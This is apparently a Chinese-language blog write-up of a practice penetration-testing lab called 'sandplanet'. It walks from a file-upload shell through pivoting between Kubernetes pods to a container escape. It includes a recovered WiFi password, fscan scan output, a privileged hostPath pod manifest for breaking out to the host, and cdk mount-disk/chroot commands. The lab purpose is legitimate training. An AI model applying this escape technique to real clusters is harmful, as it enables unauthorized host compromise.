---
title: 'sandplanet'
date: 2026-02-24 12:30:21 +0800
categories:
  - 渗透练习
  - mazesec
tags:
  - 容器逃逸
  - 流量解密
---
## sandplanet



![image-20260224102843829](/assets/img/posts/sandplanet/image-20260224102843829.png)

简单的文件上传，好像没waf

![image-20260224103355803](/assets/img/posts/sandplanet/image-20260224103355803.png)

弹个shell

![image-20260224103731163](/assets/img/posts/sandplanet/image-20260224103731163.png)

其实端口枚举也显示了，上面部署了k8s，现在应该是在一个pod里

![image-20260224104608576](/assets/img/posts/sandplanet/image-20260224104608576.png)

![image-20260224104724303](/assets/img/posts/sandplanet/image-20260224104724303.png)

简单枚举了一下，但是没有什么收获，linpeas都是扫出来env里有一个 PIVOT_SVC

![image-20260224105845099](/assets/img/posts/sandplanet/image-20260224105845099.png)

nc了一下，发现是另一个容器，还有root权限，能ping到主机，那就再把shell弹回来

![image-20260224110602390](/assets/img/posts/sandplanet/image-20260224110602390.png)

把流量包拖下来，结果neta一把梭了

```
SSID: SandPlanet_Core
Password: princess
```

![image-20260224111120595](/assets/img/posts/sandplanet/image-20260224111120595.png)

不知道有什么用没试出来，但是cdk显示这个容器能逃逸

![image-20260224113652557](/assets/img/posts/sandplanet/image-20260224113652557.png)

怎么突然就跑掉了

![image-20260224114147680](/assets/img/posts/sandplanet/image-20260224114147680.png)

好吧，这是个非预期

其实前面枚举对了，上了fscan发现了好几个pod

```
[2.2s] [*] 目标 10.42.0.0 存活 (ICMP) [2.2s] [*] 目标 10.42.0.1 存活 (ICMP) [2.2s] [*] 目标 10.42.0.156 存活 (ICMP) [2.2s] [*] 目标 10.42.0.157 存活 (ICMP) [2.2s] [*] 目标 10.42.0.158 存活 (ICMP) [2.2s] [*] 目标 10.42.0.163 存活 (ICMP) [2.2s] [*] 目标 10.42.0.164 存活 (ICMP) [2.2s] [*] 目标 10.42.0.165 存活 (ICMP) [2.2s] [*] 目标 10.42.0.167 存活 (ICMP) [5.2s] 存活主机数量: 9 [5.2s] 有效端口数量: 233 [5.2s] [*] 端口开放 10.42.0.1:10250 [5.2s] [*] 端口开放 10.42.0.0:80 [5.2s] [*] 端口开放 10.42.0.0:22 [5.2s] [*] 端口开放 10.42.0.156:8080 [5.2s] [*] 端口开放 10.42.0.0:10250 [5.2s] [*] 端口开放 10.42.0.156:8181 [5.2s] [*] 端口开放 10.42.0.1:80 [5.2s] [*] 端口开放 10.42.0.1:22 [5.2s] [*] 端口开放 10.42.0.158:10250 [5.2s] [*] 端口开放 10.42.0.163:80 [5.3s] [*] 端口开放 10.42.0.165:22
```

其实wifi密码是密码复用

![image-20260224115004925](/assets/img/posts/sandplanet/image-20260224115004925.png)

拖一个cdk上来，其实这一台权限也很高。。

![image-20260224115403060](/assets/img/posts/sandplanet/image-20260224115403060.png)

这里Pod自动加载目录可写

![image-20260224115454512](/assets/img/posts/sandplanet/image-20260224115454512.png)

```bash
cd /mnt/k8s_config

cat > escape.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: kube-system
spec:
  containers:
  - name: escape
    image: rancher/mirrored-coredns-coredns:1.11.1   # 常见版本：1.10.x / 1.11.x / 1.8.x，根据 k3s 版本
    command: ["/bin/sh", "-c", "sleep 864000"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF
```

但是网络不知道哪里问题，一直拖不下来

好吧，还是用cdk吧

```bash
./cdk run mount-disk
chroot /tmp/cdk_d1INk /bin/bash
```

![image-20260224122851091](/assets/img/posts/sandplanet/image-20260224122851091.png)

